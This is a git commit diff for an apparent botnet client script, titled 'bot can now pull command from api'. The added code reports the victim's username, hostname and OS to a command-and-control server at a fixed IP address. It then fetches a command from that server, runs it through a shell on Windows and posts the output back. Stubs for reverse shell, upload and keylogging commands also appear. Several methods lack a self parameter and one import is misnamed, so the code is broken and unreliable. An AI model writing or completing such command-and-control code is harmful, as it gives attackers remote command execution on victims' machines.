ab2a4dd4edfc357c937215d1a6d5672c419893d7
Utkarsh Prakash <utkarsh.prakash.us@gmail.com>
2020-04-08 22:36:04 -0700

    bot can now pull command from api

--- client/client.py
+++ client/client.py
@@ -1,32 +1,32 @@
 from datetime import datetime
+import time
+import uuid
 import random
 import sockets
 import requests
 import platform
 import os
+from subprocess import check_output
 
-def curr_user():
-        user = os.popen('whoami').read()
-        user = user.split("\\", 1)[-1]
-        return user
     
 class Bot(object):
     
 
     def __init__(self):
         self.platform = platform.system()
-        self.uid = "2135"
-        self.username = curr_user()
+        self.uid = hex(uuid.get_node())
+        self.username = self.curr_user()
         self.hostname = "end again"
+
+    def curr_user():
+        user = os.popen('whoami').read()
+        user = user.split("\\", 1)[-1]
+        return user
 
     def reverse_shell(self):
         print("end")
 
     def ping_server(self):
-        print("pushing info to cnc")
-        print("username : " + self.username)
-        print("hostname : " + self.hostname)
-        print("OS : " + self.platform)
         send = {
                     'platform': str(self.platform),
                     'hostname': self.hostname,
@@ -36,29 +36,32 @@ class Bot(object):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
         return r.text
 
+    def send_output(output):
+        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/report', data= {'output':output})
+
+    def run_command(command):
+        if self.platform == "Windows":
+            self.send_output(check_output(command, shell=True).decode())
+
     def run(self):
-        print(self.ping_server())
-        
+
+        self.run_command(self.ping_server())
+
         """
+        start = time.time()
         while True:
-            try:
-                job = self.ping_server()
-                if job:
-                    print(line)
-                    line = job
-                    split_cmd = job.split(" ")
-                    if len(split_cmd) > 0:
-                        cmd = split_cmd[0]
-                        args = split_cmd[1:]
-                        if cmd == 'shell':
-                            self.reverse_shell()
-                        if cmd == 'upload':
-                            print("end")
-                        if cmd == 'keylog':
-                            print("end")
-            except:
-                print("get fuct")
-            """
+            job = self.ping_server()
+
+
+
+
+            time.sleep(60.0 - ((time.time() - start) % 60.0))
+
+
+        print(self.ping_server())
+        """
+
+       
 def main():
     bot = Bot()
     bot.run()
